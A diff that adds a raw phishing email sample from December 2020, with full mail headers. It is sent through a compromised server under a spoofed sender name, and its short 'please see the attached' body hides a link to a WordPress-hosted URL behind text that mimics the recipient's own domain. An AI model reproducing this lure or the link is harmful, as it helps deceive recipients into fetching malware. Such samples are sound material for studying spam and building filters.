@@ -1,0 +1,60 @@
+Return-Path: <general@mecatec.hn>
+Received: from mail.mecatec.hn (unknown [168.228.193.6])
+	(using TLSv1.2 with cipher AECDH-AES256-SHA (256/256 bits))
+	(No client certificate requested)
+	by [recipient's email server] (Postfix) with ESMTPS id 4D0bYX69kSz9rwX
+	for [recipient's email address]; Tue, 22 Dec 2020 12:41:15 +0000 (UTC)
+Received: from localhost (localhost [127.0.0.1])
+	by mail.mecatec.hn (Postfix) with ESMTP id 9E6A28519F66
+	for [recipient's email address]; Tue, 22 Dec 2020 06:37:46 -0600 (CST)
+Received: from mail.mecatec.hn ([127.0.0.1])
+	by localhost (mail.mecatec.hn [127.0.0.1]) (amavisd-new, port 10032)
+	with ESMTP id 7K4LuLOoXFiJ for [recipient's email address];
+	Tue, 22 Dec 2020 06:37:46 -0600 (CST)
+Received: from localhost (localhost [127.0.0.1])
+	by mail.mecatec.hn (Postfix) with ESMTP id 1B8148519F62
+	for [recipient's email address]; Tue, 22 Dec 2020 06:37:46 -0600 (CST)
+DKIM-Filter: OpenDKIM Filter v2.10.3 mail.mecatec.hn 1B8148519F62
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=mecatec.hn;
+	s=77389B7C-BC94-11EA-AB60-2DB3DCA7E970; t=1608640666;
+	bh=h9NGU8ZIb7kuXl91XYneVjbYmI53zCmDF0I5yXbq7fo=;
+	h=Date:From:To:MIME-Version:Message-Id;
+	b=xlQT3vKh76uLWNastBSjjMDjZcya/ValftmhoQ1jYtm/iqF3QG7zk9o5A8xR6gpxu
+	 64o+3NR9fLarWFkiwcKxy+oTxuuRGOa+2S0V5cQop59mDJ1OsHrvSNEtV+FszU2lvM
+	 8HPQYKc61jO35PD2N1V6ZjIHcwJBbHv2twUdU268DpRJ5/W57C8Bw7q73dWFpEmeO7
+	 mWJSDfcqUnUoR3vMpsVDQb1saVfpt+/fh+tKCIYbwDb7agCrvW8aNYcdXSF+3d4dZG
+	 CEXrWaU75VgENNqFhnF5AUfneS7BmGHU1qfCz4NNwQpgqHz51V7O+KJ8h7ljHGxV48
+	 NtzaUueLyvYDQ==
+Received: from mail.mecatec.hn ([127.0.0.1])
+	by localhost (mail.mecatec.hn [127.0.0.1]) (amavisd-new, port 10026)
+	with ESMTP id drbVZycYHlmr for [recipient's email address];
+	Tue, 22 Dec 2020 06:37:46 -0600 (CST)
+Received: from [10.0.0.8] (unknown [102.177.198.118])
+	by mail.mecatec.hn (Postfix) with ESMTPSA id DC3F18519EDD
+	for [recipient's email]; Tue, 22 Dec 2020 06:37:44 -0600 (CST)
+Date: Tue, 22 Dec 2020 14:37:43 +0200
+From: "[spoofed sender name]" <general@mecatec.hn>
+To: "[recipient's name]" <[recipient's email address]>
+Subject: [recipient's name]
+MIME-Version: 1.0
+Content-Type: text/html; charset=UTF-8
+Content-Transfer-Encoding: quoted-printable
+Message-Id: <20201222123744.DC3F18519EDD@mail.mecatec.hn>
+X-Recommended-Action: reject
+
+<html>
+<body>
+Thank you for your help. Please see the attached.=0D
+<br>
+<br>
+<a href=3D"http://deepakjaintinu.com/wp-includes/qVFbUJkT2s1xVYlBcyv04aONpR=
+5x8UyHSRO/">http://[recipient's email domain]/MEDIA/xu0vv-44495226-427795-8=
+57y-baqsj948v</a>
+<br>
+<br>
+<br>
+
+
+[spoofed sender name]
+</body>
+</html>
